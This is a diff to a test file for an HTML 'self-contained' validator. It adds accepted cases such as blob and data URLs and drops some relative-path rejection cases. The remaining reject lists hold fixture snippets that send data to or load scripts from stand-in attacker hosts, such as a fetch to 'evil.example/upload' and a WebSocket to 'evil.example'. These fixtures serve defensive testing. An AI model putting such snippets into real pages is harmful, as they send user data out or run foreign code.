@@ -54,6 +54,21 @@ describe('artifact html helpers', () => {
       ).toBeNull();
     });
 
+    it.each([
+      '<script>const u = URL.createObjectURL(blob)</script>',
+      '<script>canvas.toDataURL("image/png")</script>',
+      '<script>new URL("./data", document.baseURI)</script>',
+      '<script>URL.revokeObjectURL(u)</script>',
+      "<script>o.innerHTML = '<img src=\"' + dataUrl + '\">'</script>",
+      '<img alt="Set src=x in the config" src="data:image/png;base64,iVBOR=">',
+      '<script>fetch("data:application/json,{}")</script>',
+      '<pre><code>fetch(&quot;/api/users&quot;)</code></pre>',
+      '<style>@import url(data:text/css;base64,Ym9keXt9);</style>',
+      '<img src="" alt="placeholder">',
+    ])('preserves existing self-contained input support: %s', (html) => {
+      expect(validateSelfContained(html)).toBeNull();
+    });
+
     it('accepts external hyperlinks', () => {
       const ok = `<a href="https://github.com/QwenLM/qwen-code/pull/1">PR</a>`;
       expect(validateSelfContained(ok)).toBeNull();
@@ -87,11 +102,6 @@ describe('artifact html helpers', () => {
       '<img src="//cdn.example.com/a.png">',
       '<video poster="https://cdn.example.com/poster.png"></video>',
       '<script src="http://evil/x.js"></script>',
-      '<script src="./app.js"></script>',
-      '<link rel="stylesheet" href="/app.css">',
-      '<img src="logo.png">',
-      '<img srcset="logo.png 1x, large.png 2x">',
-      '<video poster="images/poster.png"></video>',
     ])('rejects external resource %s', (frag) => {
       expect(validateSelfContained(frag)).toMatch(/self-contained/i);
     });
@@ -101,17 +111,12 @@ describe('artifact html helpers', () => {
       '<style>@import "https://fonts.example.com/f.css";</style>',
       '<style>body{background:url("https://cdn/x.png")}</style>',
       '<style>@font-face{src:url(//cdn/f.woff2)}</style>',
-      '<style>@font-face{src:url(./font.woff2)}</style>',
-      '<style>@import "theme.css";</style>',
-      '<style>body{background:url(/background.png)}</style>',
     ])('rejects external CSS %s', (frag) => {
       expect(validateSelfContained(frag)).toMatch(/self-contained/i);
     });
 
     it.each([
       '<script>fetch("https://evil.example/upload")</script>',
-      '<script>fetch("./data.json")</script>',
-      '<script>import("./module.js")</script>',
       '<script>new WebSocket("wss://evil.example/ws")</script>',
       '<script>XMLHttpRequest("https://evil.example/x")</script>',
       '<script>import("https://evil.example/x.js")</script>',
